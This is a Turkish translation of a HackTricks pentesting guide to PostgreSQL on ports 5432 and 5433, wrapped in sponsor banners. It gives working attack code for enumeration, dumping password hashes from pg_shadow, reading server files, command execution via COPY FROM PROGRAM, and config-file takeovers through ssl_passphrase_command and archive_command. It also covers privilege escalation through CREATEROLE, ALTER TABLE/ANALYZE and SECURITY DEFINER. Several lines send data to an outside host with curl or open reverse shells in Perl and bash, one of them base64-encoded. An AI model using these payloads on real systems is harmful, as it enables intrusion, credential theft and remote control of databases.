# 5432,5433 - Postgresql Pentesting

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturabilir ve otomatikleştirebilirsiniz.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

## **Temel Bilgiler**

**PostgreSQL**, SQL dilini kullanmanın yanı sıra ek özelliklerle geliştirilen ve **açık kaynaklı** bir **nesne ilişkisel veritabanı sistemi** olarak tanımlanır. Yetenekleri, çeşitli veri tiplerini ve işlemleri ele alabilmesini sağlar, bu da geliştiriciler ve kuruluşlar için çok yönlü bir seçenek yapar.

**Varsayılan port:** 5432 ve bu port zaten kullanılıyorsa, postgresql muhtemelen kullanılmayan bir sonraki portu (muhtemelen 5433) kullanacaktır.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Bağlanma ve Temel Enum

PostgreSQL veritabanı sunucusuna bağlanmak için çeşitli yöntemler vardır. İlk olarak, `psql` komutunu kullanarak terminal üzerinden bağlanabilirsiniz:

```bash
psql -h <hedef_IP> -p <hedef_port> -U <kullanıcı_adı> -d <veritabanı_adı>
```

Alternatif olarak, Python `psycopg2` modülünü kullanarak da bağlantı yapabilirsiniz:

```python
import psycopg2

conn = psycopg2.connect(
    host="<hedef_IP>",
    port=<hedef_port>,
    user="<kullanıcı_adı>",
    password="<şifre>",
    database="<veritabanı_adı>"
)
```

Bağlandıktan sonra, aşağıdaki komutları kullanarak temel enum işlemlerini gerçekleştirebilirsiniz:

- `SELECT version();`: PostgreSQL sunucusunun sürümünü alır.
- `SELECT current_user;`: Mevcut kullanıcıyı alır.
- `SELECT current_database();`: Mevcut veritabanını alır.
- `SELECT * FROM pg_user;`: Tüm kullanıcıları listeler.
- `SELECT * FROM pg_shadow;`: Tüm kullanıcı şifrelerini listeler.
- `SELECT * FROM pg_roles;`: Tüm rolleri listeler.
- `SELECT * FROM pg_group;`: Tüm grupları listeler.
- `SELECT * FROM pg_stat_activity;`: Mevcut etkin bağlantıları listeler.

Bu komutlar, PostgreSQL sunucusu hakkında temel bilgileri elde etmenize yardımcı olacaktır.
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
**`\list`** komutunu çalıştırarak **`rdsadmin`** adında bir veritabanı bulursanız, bir **AWS PostgreSQL veritabanı** içinde olduğunuzu bilirsiniz.
{% endhint %}

Daha fazla bilgi için **PostgreSQL veritabanını kötüye kullanma** hakkında kontrol edin:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Otomatik Numaralandırma
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Port taraması**

[**Bu araştırmaya**](https://www.exploit-db.com/papers/13084) göre, bir bağlantı denemesi başarısız olduğunda, `dblink` bir hata açıklaması içeren `sqlclient_unable_to_establish_sqlconnection` istisnası fırlatır. Bu ayrıntıların örnekleri aşağıda listelenmiştir.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* Host kapalı

`DETAY: Sunucuya bağlanılamadı: Hedefe yönlendirme yok. Sunucu "1.2.3.4" üzerinde çalışıyor mu ve TCP/IP bağlantıları için 5678 numaralı portu kabul ediyor mu?`

* Port kapalı
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* Port açık
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
veya
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* Port açık veya filtrelenmiş
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
PL/pgSQL fonksiyonlarında, şu anda istisna ayrıntılarını elde etmek mümkün değildir. Bununla birlikte, PostgreSQL sunucusuna doğrudan erişiminiz varsa, gerekli bilgileri alabilirsiniz. Sistem tablolarından kullanıcı adlarını ve parolalarını çıkarmak mümkün değilse, olumlu sonuçlar elde edebilecek olan önceki bölümde tartışılan wordlist saldırı yöntemini kullanmayı düşünebilirsiniz.

## Yetkilendirme Saptama

### Roller

| Rol Türleri    |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Rol süper kullanıcı yetkilerine sahiptir                                                                                                             |
| rolinherit     | Rol, üyesi olduğu rollerin yetkilerini otomatik olarak devralır                                                                                        |
| rolcreaterole  | Rol, daha fazla rol oluşturabilir                                                                                                                    |
| rolcreatedb    | Rol, veritabanları oluşturabilir                                                                                                                      |
| rolcanlogin    | Rol oturum açabilir. Yani, bu rol, başlangıç oturum yetkilendirme kimliği olarak verilebilir                                                         |
| rolreplication | Rol bir replikasyon rolüdür. Bir replikasyon rolü replikasyon bağlantıları başlatabilir ve replikasyon yuvaları oluşturabilir ve silebilir.               |
| rolconnlimit   | Oturum açabilen roller için, bu rolün yapabileceği eşzamanlı bağlantıların maksimum sayısını ayarlar. -1 sınırsız anlamına gelir.                       |
| rolpassword    | Parola değil (her zaman `********` olarak okunur)                                                                                                    |
| rolvaliduntil  | Parola süresi dolma zamanı (yalnızca parola kimlik doğrulaması için kullanılır); süresi dolmazsa null                                                   |
| rolbypassrls   | Rol, her satır düzeyi güvenlik politikasını atlar, daha fazla bilgi için [Bölüm 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html)'e bakın. |
| rolconfig      | Çalışma zamanı yapılandırma değişkenleri için rol özel varsayılanlar                                                                                  |
| oid            | Rolün kimliği                                                                                                                                       |

#### İlginç Gruplar

* **`pg_execute_server_program`** üyesiyseniz, programları **çalıştırabilirsiniz**
* **`pg_read_server_files`** üyesiyseniz, dosyaları **okuyabilirsiniz**
* **`pg_write_server_files`** üyesiyseniz, dosyalara **yazabilirsiniz**

{% hint style="info" %}
Postgres'te bir **kullanıcı**, bir **grup** ve bir **rol** aynıdır. Sadece **nasıl kullandığınıza** ve **oturum açmasına izin verip vermediğinize** bağlıdır.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tablolar

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
```

Bu sorgu, PostgreSQL veritabanında bulunan tüm tabloların isimlerini döndürür.
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Fonksiyonlar

Functions in PostgreSQL are named blocks of code that can be executed by calling their name. They are used to perform specific tasks and can accept parameters and return values. In PostgreSQL, functions are created using the `CREATE FUNCTION` statement.

PostgreSQL'de fonksiyonlar, adlarını çağırarak çalıştırılabilen adlandırılmış kod bloklarıdır. Belirli görevleri gerçekleştirmek için kullanılırlar ve parametreleri kabul edebilir ve değer döndürebilirler. PostgreSQL'de fonksiyonlar, `CREATE FUNCTION` ifadesi kullanılarak oluşturulur.

The basic syntax for creating a function in PostgreSQL is as follows:

PostgreSQL'de bir fonksiyon oluşturmak için temel sözdizimi aşağıdaki gibidir:

```sql
CREATE FUNCTION function_name ([parameter1 data_type [, parameter2 data_type, ...]])
  RETURNS return_data_type
  LANGUAGE language_name
AS $$
  -- Function body
$$;
```

- `function_name` is the name of the function.
- `parameter1`, `parameter2`, etc. are the input parameters of the function, along with their data types.
- `return_data_type` is the data type of the value returned by the function.
- `language_name` is the programming language used to write the function code.
- `-- Function body` is the code that defines the logic of the function.

- `function_name`, fonksiyonun adıdır.
- `parameter1`, `parameter2`, vb., fonksiyonun giriş parametreleridir ve veri tipleriyle birlikte belirtilir.
- `return_data_type`, fonksiyon tarafından döndürülen değerin veri tipidir.
- `language_name`, fonksiyon kodunu yazmak için kullanılan programlama dilidir.
- `-- Fonksiyon gövdesi`, fonksiyonun mantığını tanımlayan kod parçacığıdır.

Here's an example of a simple function that calculates the sum of two numbers:

İşte iki sayının toplamını hesaplayan basit bir fonksiyon örneği:

```sql
CREATE FUNCTION sum_numbers(a integer, b integer)
  RETURNS integer
  LANGUAGE plpgsql
AS $$
BEGIN
  RETURN a + b;
END;
$$;
```

In this example, the function is named `sum_numbers` and accepts two input parameters of type `integer`. It returns a value of type `integer`. The function body consists of a single statement that adds the two input parameters and returns the result.

Bu örnekte, fonksiyon `sum_numbers` olarak adlandırılmış ve `integer` türünde iki giriş parametresi kabul eder. `integer` türünde bir değer döndürür. Fonksiyon gövdesi, iki giriş parametresini ekleyen ve sonucu döndüren tek bir ifadeden oluşur.
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Dosya sistemi işlemleri

### Dizinleri ve dosyaları okuma

Bu [**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) ile tanımlanan **`DEFAULT_ROLE_READ_SERVER_FILES`** grubunun üyeleri (yani **`pg_read_server_files`**) ve **süper kullanıcılar**, herhangi bir yol üzerinde **`COPY`** yöntemini kullanabilir (bkz. `genfile.c` içindeki `convert_and_check_filename`).
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
Unutmayın, süper kullanıcı değilseniz ancak **CREATEROLE** izinlerine sahipseniz, **kendinizi o gruba üye yapabilirsiniz:**
```sql
GRANT pg_read_server_files TO username;
```
[**Daha fazla bilgi.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

**Dosya okuma veya dizin listeleme** işlemleri için kullanılabilecek **diğer postgres fonksiyonları** bulunmaktadır. Bunları yalnızca **süper kullanıcılar** ve **açık izinlere sahip kullanıcılar** kullanabilir:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Daha fazla işlevi [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html) adresinde bulabilirsiniz.

### Basit Dosya Yazma

Sadece **süper kullanıcılar** ve **`pg_write_server_files`** üyeleri, dosya yazmak için kopyalamayı kullanabilir.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
Unutmayın, süper kullanıcı değilseniz ancak **`CREATEROLE`** izinlerine sahipseniz, **kendinizi o gruba üye yapabilirsiniz:**
```sql
GRANT pg_write_server_files TO username;
```
[**Daha fazla bilgi.**](pentesting-postgresql.md#createrole-ile-ayrıcalık-yükseltme)
{% endhint %}

Unutmayın ki COPY, yeni satır karakterlerini işleyemez, bu yüzden bir base64 yükü kullanıyor olsanız bile **tek satırlık bir komut göndermeniz gerekmektedir**.\
Bu teknikin çok önemli bir kısıtlaması vardır, **`copy` binary dosyaları yazmak için kullanılamaz çünkü bazı binary değerleri değiştirir**.

### **Binary dosyaların yüklenmesi**

Ancak, **büyük binary dosyaları yüklemek için başka teknikler de vardır:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Bug bounty ipucu**: **Intigriti'ye kaydolun**, hackerlar tarafından oluşturulan bir premium **bug bounty platformuna**! Bugün [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresinde bize katılın ve **$100,000**'e kadar ödüller kazanmaya başlayın!

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **Programa RCE**

[9.3 sürümünden](https://www.postgresql.org/docs/9.3/release-9-3.html) itibaren, sadece **süper kullanıcılar** ve **`pg_execute_server_program`** grubunun üyeleri, RCE için copy komutunu kullanabilir (örnek ile veri çalma:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Örnek çalıştırmak için:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
Unutmayın, süper kullanıcı değilseniz ancak **`CREATEROLE`** izinlerine sahipseniz, **kendinizi o gruba üye yapabilirsiniz:**
```sql
GRANT pg_execute_server_program TO username;
```
[**Daha fazla bilgi.**](pentesting-postgresql.md#createrole-ile-ayrıcalık-yükseltme)
{% endhint %}

Veya **metasploit**'in `multi/postgres/postgres_copy_from_program_cmd_exec` modülünü kullanın. Bu zafiyet hakkında daha fazla bilgi [**burada**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) bulunabilir. CVE-2019-9193 olarak bildirilmesine rağmen, Postges bunun bir [özellik olduğunu ve düzeltilemeyeceğini](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/) açıkladı.

### PostgreSQL Dilleri ile RCE

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### PostgreSQL uzantıları ile RCE

Önceki yazıdan **nasıl ikili dosyalar yükleneceğini öğrendikten** sonra, bir postgresql uzantısı yükleyerek **RCE elde etmeyi** deneyebilirsiniz.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### PostgreSQL yapılandırma dosyası RCE

Postgresql'in **yapılandırma dosyası**, veritabanını çalıştıran **postgres kullanıcısı** tarafından **yazılabilir** olduğundan, **süper kullanıcı** olarak dosyaları dosya sistemine yazabilir ve bu nedenle bu dosyayı **üzerine yazabilirsiniz**.

![](<../.gitbook/assets/image (303).png>)

#### **ssl\_passphrase\_command** ile RCE

Bu teknik hakkında daha fazla bilgi [burada](https://pulsesecurity.co.nz/articles/postgres-sqli) bulunabilir.

Yapılandırma dosyasında RCE'ye yol açabilecek bazı ilginç özellikler bulunur:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Veritabanının özel anahtarının yolu
* `ssl_passphrase_command = ''` Özel dosya şifreyle korunuyorsa (şifrelenmişse), postgresql bu özelliğe belirtilen komutu **yürütür**.
* `ssl_passphrase_command_supports_reload = off` Bu özellik **açıksa**, anahtar şifreyle korunuyorsa **komut** `pg_reload_conf()` **çalıştırıldığında** **yürütülür**.

Bir saldırganın yapması gerekenler:

1. Sunucudan **özel anahtarı** çıkarın
2. İndirilen özel anahtarı **şifreleyin**:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. Üzerine yazın
4. Mevcut postgresql **yapılandırmasını** dökün
5. Bahsedilen özellikler yapılandırmasıyla **yapılandırmayı üzerine yazın**:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. `pg_reload_conf()`'u çalıştırın

Bu test sırasında, bu işlemin yalnızca **özel anahtar dosyasının 640 ayrıcalığına sahip olması**, **root tarafından sahiplenilmesi** ve **ssl-cert veya postgres** grubuna ait olması (bu nedenle postgres kullanıcısı okuyabilir) ve _/var/lib/postgresql/12/main_ dizinine yerleştirilmesi durumunda çalışacağını fark ettim.

#### **archive\_command** ile RCE

Bu yapılandırma ve WAL hakkında daha fazla bilgi [burada](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3) bulunabilir.

Yapılandırma dosyasındaki başka bir sözde `archive_command` kullanılabilir özelliktir.

Bunun çalışması için `archive_mode` ayarının `'on'` veya `'always'` olması gerekmektedir. Bu durum doğruysa, `archive_command` içindeki komutu üzerine yazabilir ve WAL (write-ahead logging) işlemleri aracılığıyla çalışmasını zorlayabiliriz.

Genel adımlar şunlardır:

1. Arşiv modunun etkin olup olmadığını kontrol edin: `SELECT current_setting('archive_mode')`
2. `archive_command`'ı payload ile üzerine yazın. Örneğin, ters kabuk için: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Yapılandırmayı yeniden yükleyin: `SELECT pg_reload_conf()`
4. Arşiv işleminin çalışmasını zorlayın, bu da arşiv komutunu çağıracaktır: Bazı Postgres sürümleri için `SELECT pg_switch_xlog()` veya `SELECT pg_switch_wal()`

## **Postgres Ayrıcalık Yükseltme**

### CREATEROLE Ayrıcalık Yükseltme

#### **Grant**

[**Belgelere**](https://www.postgresql.org/docs/13/sql-grant.html) göre: **`CREATEROLE`** ayrıcalığına sahip roller, **süper kullanıcı** olmayan **herhangi bir role** üyelik **verebilir veya geri alabilir**.

Bu nedenle, **`CREATEROLE`** iznine sahipseniz, kendinize diğer **roller** (süper kullanıcı olmayanlar) için erişim izni verebilirsiniz, bu da size dosya okuma ve yazma yeteneği ve komut yürütme seçeneği verebilir.
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Şifre Değiştirme

Bu roldeki kullanıcılar, diğer **süper kullanıcılar** dışındaki **kullanıcıların şifrelerini değiştirebilirler**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### SUPERUSER'a Yükseltme

Çok yaygın bir durumdur ki **yerel kullanıcılar herhangi bir şifre girmeden PostgreSQL'e giriş yapabilir**. Bu nedenle, **kod çalıştırma izinlerini** elde ettiğinizde bu izinleri kullanarak **`SUPERUSER`** rolünü elde edebilirsiniz:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Bu genellikle **`pg_hba.conf`** dosyasındaki aşağıdaki satırlar sayesinde mümkündür:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE privesc**

[**Bu yazıda**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) kullanıcıya verilen ALTER TABLE yetkisini kötüye kullanarak Postgres GCP'de **privesc** yapmanın nasıl mümkün olduğu açıklanmaktadır.

Bir tabloyu başka bir kullanıcının sahibi yapmaya çalıştığınızda, bunu engelleyen bir **hata** almanız gerekiyor, ancak görünüşe göre GCP, bu **seçeneği süper kullanıcı olmayan postgres kullanıcısına** vermiş:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Bu fikri, **INSERT/UPDATE/ANALYZE** komutlarının bir **indeks işlevine sahip bir tabloda** çalıştırıldığında, **işlevin** komutun bir parçası olarak **çağrıldığı ve tablonun sahibinin izinlerini** kullandığı gerçeğiyle birleştirerek düşünebiliriz. Bir işlevle bir indeks oluşturmak ve bu tabloya sahip bir **süper kullanıcıya sahip izinler** vermek, ardından sahibin izinlerini kullanan kötü niyetli bir işlevle tabloyu ANALYZE etmek mümkündür. Bu sayede komutları yürütebilecek çünkü sahibin izinlerini kullanmaktadır.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Sömürü

1. Yeni bir tablo oluşturarak başlayın.
2. Tabloya ilgisiz içerikler ekleyerek, dizin işlevi için veri sağlayın.
3. Yetkisiz komutların yürütülmesine izin veren bir kod yürütme yükü içeren kötü amaçlı bir dizin işlevi geliştirin.
4. Tablonun sahibini "cloudsqladmin" olarak DEĞİŞTİRİN. Bu, Cloud SQL tarafından veritabanını yönetmek ve sürdürmek için özel olarak kullanılan GCP'nin süper kullanıcı rolüdür.
5. Tabloya bir ANALYZE işlemi gerçekleştirin. Bu işlem, PostgreSQL motorunun tablonun sahibi olan "cloudsqladmin" kullanıcı bağlamına geçmesini sağlar. Sonuç olarak, kötü amaçlı dizin işlevi "cloudsqladmin" izinleriyle çağrılır ve önceden yetkilendirilmemiş kabuk komutunun yürütülmesine olanak tanır.

PostgreSQL'de bu akış şuna benzer:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Ardından, `shell_commands_results` tablosu, yürütülen kodun çıktısını içerecektir:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Yerel Giriş

Bazı yanlış yapılandırılmış postgresql örnekleri, herhangi bir yerel kullanıcının girişine izin verebilir. **`dblink` fonksiyonunu** kullanarak 127.0.0.1'den yerel olarak giriş yapmak mümkündür:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
Önceki sorgunun çalışması için **`dblink` fonksiyonunun var olması gerektiğini** unutmayın. Eğer yoksa, aşağıdaki komutu kullanarak oluşturmayı deneyebilirsiniz:
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Eğer daha fazla ayrıcalığa sahip bir kullanıcının şifresine sahipseniz, ancak kullanıcının harici bir IP'den giriş yapmasına izin verilmiyorsa, aşağıdaki işlevi kullanarak o kullanıcı olarak sorguları çalıştırabilirsiniz:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Bu işlevin var olup olmadığını kontrol etmek mümkündür:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **SECURITY DEFINER ile tanımlanan özel işlev**

[**Bu yazıda**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), IBM tarafından sağlanan bir postgres örneğinde pentester'lar, **SECURITY DEFINER bayrağına sahip bu işlevi buldukları için** bir postgres örneği içinde privesc yapmayı başardılar:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

[**Belgelerde açıklandığı gibi**](https://www.postgresql.org/docs/current/sql-createfunction.html), **SECURITY DEFINER ile tanımlanan bir işlev**, ona sahip olan kullanıcının ayrıcalıklarıyla çalıştırılır. Bu nedenle, işlev **SQL Injection'a karşı savunmasızsa** veya saldırgan tarafından kontrol edilen bazı parametrelerle **ayrıcalıklı eylemler gerçekleştiriyorsa**, postgres içinde **ayrıcalıkları yükseltmek** için kötüye kullanılabilir.

Önceki kodun 4. satırında işlevin **SECURITY DEFINER** bayrağına sahip olduğunu görebilirsiniz.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
Ve ardından **komutları çalıştırın**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### PL/pgSQL ile Burteforce Geçin

